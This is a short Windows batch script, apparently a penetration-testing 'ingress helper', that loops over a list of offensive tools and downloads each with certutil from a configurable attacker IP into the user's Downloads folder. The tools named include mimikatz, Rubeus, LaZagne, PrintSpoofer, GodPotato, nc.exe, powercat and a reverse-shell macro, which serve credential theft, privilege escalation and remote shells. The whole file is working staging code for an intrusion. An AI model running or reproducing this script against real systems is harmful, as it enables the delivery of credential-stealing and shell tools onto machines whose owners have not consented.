@echo off
:: this file is intended to move files in a bulk fashion as an ingress helper
setlocal
set myIP=10.10.14.189
:: change your IP
set destinationFolder=%USERPROFILE%\Downloads
:: change your destinationFolder if you wish
set files=powercat.ps1 pmap.ps1 PsMapExec.ps1 pmap.psd1 pmap.psm1 reverse_shell.vba config.Library-ms mimikatz.exe FullPowers.exe Rubeus.exe SafetyKatz.exe Seatbelt.exe winPEASany.exe PowerUp.ps1 jaws-enum.ps1 SessionGopher.ps1 LaZagne.exe binary.exe accesschk.exe PrintSpoofer64 PrintSpoofer32 socatx64.exe socatx86.exe GodPotato-Net2.exe GodPotato-Net35.exe GodPotato-Net4.exe nc.exe Watson.exe

for %%f in (%files%) do (
    echo Downloading %%f...
    certutil -urlcache -split -f "http://%myIP%/%%f" "%destinationFolder%\%%f"
    
    if exist "%destinationFolder%\%%f" (
        echo Successfully downloaded %%f to %destinationFolder%
    ) else (
        echo Failed to download %%f
    )
)
echo Your files should be in your users download folder

endlocal
